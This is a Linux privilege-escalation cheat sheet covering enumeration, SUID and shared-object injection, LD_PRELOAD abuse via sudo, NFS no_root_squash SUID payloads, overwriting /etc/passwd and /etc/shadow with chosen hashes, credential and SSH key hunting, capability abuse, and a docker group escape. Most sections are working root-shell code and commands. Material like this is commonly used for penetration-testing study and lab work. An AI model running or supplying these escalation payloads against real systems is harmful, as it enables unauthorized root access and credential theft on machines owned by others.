1 - [Initial Enumeration](#Initial-Enumeration)

2 - [Kernel Exploit](#Kernel-Exploit)

3 - [PATH Variable](#PATH-Variable)
    
4 - [SUID and SGID](#SUID-and-SGID)
    
5 - [Scheduled tasks](#Scheduled-tasks)
    
6 - [Sudo](#Sudo)
    
7 - [NFS](#NFS)
    
8 - [Weak files permissions](#Weak-files-permission)

9 - [Services exploits](#Services-exploits)

10 - [Password](#Password) 

11 - [Python library hijacking](#Python-library-hijacking)- TODO!

12 - [lxd or lxc group](#lxd-or-lxc-group)
  
13 - [Using Capabilities](#Using-capabilities)

14 - [Unmounted Disks](#Unmounted-Disks)

15 - [Docker](#Docker)- TODO!

16 - [Automated Tools](#Automated-Tools)

--------------------------------------------------------------------------------------------------------------------------------

# Initial Enumeration

- Operation system, Kernel & Hostname, Architecture
```
> cat /etc/issue
> cat /proc/version
> hostname
> uname -a
> lscpu
```

- Users enumeration
```
cat /etc/passwd | cut -d : -f 1
```

- Network enumeration
```
> ip route
> netstat -ano
> apr -a 
> ip neigh
```

- Show running process
```
ps aux
```

--------------------------------------------------------------------------------------------------------------------------------

# Kernel-Exploit

- Use linux-exploit-suggester
```
linux-exploit-suggester.sh
```
- Useful kernel exploit repository
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

--------------------------------------------------------------------------------------------------------------------------------

# PATH Variable
PATH in Linux is an environmental variable that tells the operating system where to search for executables. If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script

- Check the PATH
```
echo $PATH
```
You have to check:
- Does your current user have write privileges for any of these folders?
- Can you modify $PATH?

Check writeable folders:
```
find / -writable 2>/dev/null
find / -writable 2>/dev/null | grep [main_folder] | cut -d "/" -f 2,3 | sort -u => easier to run our writable folder search once more to cover subfolders
```
modify PATH
```
export PATH=/tmp:$PATH
```
change binary permissions:
```
chmod 777 your_binary
```

## Search for text chains in compiled program

- Running strings:
```
strings /path/to/file
```

- Running strace:
```
strace -v -f -e execve <command> 2>&1 | grep exec
```

- Running ltrace:
```
ltrace <command>
```
--------------------------------------------------------------------------------------------------------------------------------
# SUID and SGID
SUID and SGID files can be executed with the permission level of the file owner or the group owner, respectively.

- SUID: executed with the privileges of the file owner
- SGID: executed with the privileges of the file group

- Search for SUID and SGID file
```
find / -perm -1000 -type d 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null ------> Shared objects
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} ; 2> /dev/null -------> Doesn't work
find / -perm -4000 -type f 2>/dev/null
find / -user root -type f -perm -4000  -ls 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null
find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null
find / -user root -perm -002 -type f -not -path "/" 2>/dev/null
find / -writable -type f 2>/dev/null
```

- Strace for track suid file execute
```
strace /suid/file/path 2>&1 | grep -iE "open|access|no such file"
strace -v -f -e execve /suid/file/path 2>&1 | grep service
```

- Shared Object Injection
When a program is executed, it will try to load the shared objects it requires.
By using a program called strace, we can track these system calls and determine whether any shared objects were not found.
If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

- Check strace
```
strace /suid/path/and/name/suid_name 2>&1 | grep -i -E "open|access|no such file"
```

- From the output, notice that a .so file is missing from a writable directory.
- Create malicious file
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

- Compile shared object file
```
gcc -shared -o /your/destination/for/malicious/file.so -fPIC /your/path/to/malicious/file.c
```

- Execute so file
for example
```
/usr/local/bin/suid-so
```

--------------------------------------------------------------------------------------------------------------------------------
# Scheduled tasks 

- Cronjob path

crontab *PATH* env variable is by default set to /usr/bin:/bin
The PATH variable can be overwritten in the crontab file
If the cron job progam/script does not use an absolute path and one of the PATH directories is wrtietable by our user, we my be able to crete a program/script with the same name as the cron job

- Enumerate Cronjobs
```
crontab -l
```

- Other cron files
```
cat /etc/crontab
cat /etc/cron.daily
[...]And more[...]
```

- Enumerate system timers
```
systemctl list-timers --all
```

- Cronjob wildcards
[Wildcard injection](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)
------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Sudo
The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges

- Check sudo version
```
sudo -V
```

- Run program using sudo
```
sudo [program]
```

- Run porgram as specific user
```
sudo -u [username] [program]
```

- List programs a user allowed to run:
```
sudo -l
```

- Other way to privileges (su program is not allowed)
```
sudo -s
sudo -i 
sudo /bin/bash
sudo passwd
```

- Shell Escaping
[https://gtfobins.github.io/](https://gtfobins.github.io/)

## Sudo Environment Variables
Programs run throuh sudo can inherit the environment variables from the users environment.
In the /etc/sudoers config file, if the env_reset option is set, sudo will run programs in a new, minimal environment.
The env_keep option can be used to keep certain environment variables from the user’s environment.
The configured options are displayed when running sudo -l

- LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. When set, the shared object will be loaded before any others.By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.LD_PRELOAD will not work if the real user ID is different from the effective user ID. Sudo must be configured to preserve the LD_PRELOAD environment variable using the env_keep option

Leverage LD_PRELOAD exploitation
- Create C code
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);  
    system("/bin/bash");
}
```
- Compile C file
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
We need to run the program by specifying the LD_PRELOAD option, as follows;
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

--------------------------------------------------------------------------------------------------------------------------------
# NFS

Shared folders and remote management interfaces such as SSH and Telnet.
NFS (Network File System) is a popular distributed file system. NFS shares are configured in the /etc/exports file.

Check NFS configuration
```
cat /etc/exports
```

The critical element for this privilege escalation vector is the "no_root_squash". By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
```
"no_root_squash" option is defined for the export folder.
```

## NFS Enumeration

- Show the NFS server’s export list:
```
showmount -e [victim_ip]
```

- Show mount nfs nmpa script:
```
nmap –sV –script=nfs-showmount [victim]
```

- Mount an NFS share:
```
mount -o rw [victim]:<share> <local_directory>
mount -o rw,vers=2 [victim]:<share> <local_directory>
```

- Root squashing
Root Squashing is how NFS prevents an obvious privilege escalation. If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group. While this behavior is default, it can be disabled!

Check the contents of /etc/exports for shares with the no_root_squash option:
```
>cat /etc/exports
[...]Example output[...]
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

- Confirm that the NFS share is available for remote mounting:
```
>showmount -e <victim_ip>
[...]Example output[...]
/tmp
```

- Create a mount point on your local machine and mount the /tmp NFS share:
```
>mkdir /tmp/nfs
>mount -o rw,vers=2 <victim_ip>:/tmp /tmp/nfs
```

- Using the root user on your local machine, generate a payload and save it to the mounted share:
```
>msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
or 
>echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
and
>gcc /tmp/1/x.c -o /tmp/1/x
```

- Make sure the file has the SUID bit set, and is executable by everyone:
```
>chmod +xs /file/path
```

- On the target machine, execute the file to get a root shell:
```
/tmp/shell.elf
```

--------------------------------------------------------------------------------------------------------------------------------
# Weak files permission

## Find files readable and writeable files

- Find all writeable files
```
find /etc -maxdepth 1 -writable -type f
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print 
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```
- Find writable by current user
```
find / perm /u=w -user whoami 2>/dev/null
find / -perm /u+w,g+w -f -user whoami 2>/dev/null
find / -perm /u+w -user whoami 2>/dev/null
```
- Find writable folder
```
find / -perm -o x -type d 2>/dev/null
```
- Find writable and executable files
```
find / -perm -o w -perm -o x -type d 2>/dev/null
```
- Find all readable files (maxdepth 1)
```
find /etc -maxdepth 1 -readable -type f
find / -perm -2 ! -type l -ls 2>/dev/null
```
- Find all directories which can be written to:
```
find / -executable -writable -type d 2> /dev/null
```
- Find all writeable directories
```
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root 
```
- Find World writable files: 
```
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null 
```
- Find world writable files in /etc: 
```
find /etc -perm -2 -type f 2>/dev/null 
```
- Find writable directories
```
find / -writable -type d 2>/dev/null
```

## Interesting files

- Crack sudo password hash
```
echo '$hash' > hash.txt'
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- /etc/passwd 
 For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow. If we can write to /etc/passwd, we can easily enter a known password hash for
the root user, and then use the su command to switch to the root user. Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries
for the same user ID, as long as the usernames are different.

- Structure:
```
root:x:0:0:root:/root:/bin/bash
```

The x in second filed instructs Linux to look for the password hash in /etc/shadow. In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password/
```
root::0:0:root:/root:/bin/bash
```

- Check the permissions of the /etc/password file (look for world writeable)
```
ls -la /etc/passw
```

- Generate a password hash for the password via openssl
```
openssl passwd "password"
L9yLGxncbOROc

openssl passwd -1 -salt "your_salt" "new_password"
e.g (openssl passwd -1 -salt "new" "123")
```

- Edit /etc/passwd file and enter the hash in the second field of the root user row
```
root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

- Log in as root

- Alternatively, append a new row to /etc/passwd
```
newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
```

## Common places for searching backup files
```
> ls -la /home
> ls -la /root
> ls -la /tmp
> ls -la /var/backups
> ls -la /opt
```

 - confirm that root logins are even allowed via SSH
```
grep PermitRootLogin /etc/ssh/sshd_config
```

## Writeable shadow file
Generate a new password hash with a password of your choice:
```
mkpasswd -m sha-512 yournewpasswordhere
```
Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
Switch to the root user, using the new password:
```
su root
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------
# Services exploits

The main target of this privileges escalation technique are services running as root

## Check local available services
- netstat -anlp
- netstat -ano
- netstat -tulpn

## Check local running services
- ps aux | grep root
- ps -ef | grep root
- top
- cat /etc/services

## Check services configuration file
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Password

- View the contents of hidden files in the users files
```
cat ~/.*history | less

cat .bash_history
```

- Search for password file or phrasses
```
> grep -r 'passw' ./*
> grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
> locate password | more
> locate pass | more
> find / -name id_rsa 2>/dev/null
> find / -name authorized_keys 2>/dev/null
> find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

- History files
```
> history
> cat .bash_history
```

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Python library hijacking

Common Requirement(At Least: the Python script must meet one of the following conditions):
- Script must be compiled into a binary format that presents SUID permissions of a higher privileged user (the executable will inherit the owner’s privileges)
- Script must be compiled into a binary format that presents SGID permissions of a higher privileged group (the executable will inherit the owner’s privileges)
- Script can be initiated using SUDO and can run under root.

### Write permissions on imported python module (override library)
- In this case we have redundant for some libraies
```
import os

[...]some_code[...]
```

- Check os.py permission
```
-rwxrwxrwx   1 root root  38995 Sep 25 05:36 os.py
```

- We can change some code in library
```
[...]some_code[...]
os.system("<malicious command>")
[...]some_code[...]
```
### Higher Priority Python Library Path with Broken Privileges
Python will search that module file through some predefined directories in a specific order of priority

- Check default searching priority
```
python2 -c 'import sys; print("\n".join(sys.path))'

python3 -c 'import sys; print("\n".join(sys.path))'
```

The searched module will be located in one of the defined paths, but if Python finds a module with the same name in a folder with higher priority, it will import that module instead of the "legit" one. The requirement for such a method to work, is to be able to create files in folders above the one in which the module resides.

### Redirecting python library search through PYTHONPATH environment variable
The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.
It can be abused if the user got privileges to set or modify that variable, usually through a script that can run with sudo permissions and got the SETENV tag set into /etc/sudoers file.

- Check if the SETENV tag is set
```
sudo -l
```
- Override PYTHONPATH
```
sudo PYTHONPATH=<your_path>
```

------------------------------------------------------------------------------------------------------------------------------------------------------------------

# lxd or lxc group

## lxd usefull resources
- [https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation)

------------------------------------------------------------------------------------------------------------------------------------------------------------

# Using capabilities
Capabilities help manage privileges at a more granular level, namely give any user running that executable the specific superuser privilege defined by the capability

- List enabled capabilities in the system
```
getcap -r / 2>/dev/null
```

example privesc with python3
```
getcap -r / 2>/dev/null

output:
/home/test/python3 = cap_setuid+ep

privesc:
./python3 -c 'import os;os.setuid(0); os.system("/bin/bash")'
```

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Unmounted Disks
- fstab
```
cat /etc/fstab
```
- mount
```
mount
```
- lsblk
```
/bin/lsblk
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Kernel modules
- lsmod
```
lsmod
```
- libata
```
/sbin/modinfo libata
```
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Docker
What is Docker
Docker is a tool designed to make it easier to create, deploy, and run applications by using containers. Containers allow a developer to package up an application with all of the parts it needs, such as libraries and other dependencies, and deploy it as one package.

Containers
Containers are an abstraction at the app layer that packages code and dependencies together. Multiple containers can run on the same machine and share the OS kernel with other containers, each running as isolated processes in user space.

Virtual machines
Virtual machines (VMs) are an abstraction of physical hardware turning one server into many servers. The hypervisor allows multiple VMs to run on a single machine. Each VM includes a full copy of an operating system, the application, necessary binaries and libraries

Basic Commands

+ Run a container:
```
docker run -di --name <name> alpine:latest

-d: detach
-i: interactive
```
+ Connect to an interactive container with a shell:
```
docker exec -ti <name> sh

-t: terminal
-i: interactiv
```
+ Run to an interactive container with a shell:
```
docker run --name <name> alpine:latest sh

-t: terminal
-i: interactive
```
+ List containers:
```
docker ps -a
```
+ Eemove a container:
```
docker rm -f <name>
```
+ Create image from the Dockerfile:
```
docker build -t myimage:version .
```
+ List images:
```
docker images
```
+ Remove image
```
docker image rm <name>:<?>
```

GTFOBins
[Docker gtfo bins](https://gtfobins.github.io/gtfobins/docker/)
In case where user is a part of group docker we can try excalate privilages
```
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
```

------------------------------------------------------------------------------------------------------------------------------------------------------------------
# Tools

Usefull script list:

- Linenum
[Linenum](https://github.com/rebootuser/LinEnum)

- Linuxprivchecker
[Linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

- LinuxExploitSuggester
[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)

- LinuxExploitSuggester2
[LinuxExploitSuggester2](https://github.com/jondonas/linux-exploit-suggester-2)

- LinuxPrivChecker
[LinuxPrivChecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

- LinuxSmartEnumeration
[LinuxSmartEnumeration](https://github.com/diego-treitos/linux-smart-enumeration)

- BeRoot
[BeRoot](https://github.com/AlessandroZ/BeRoot)
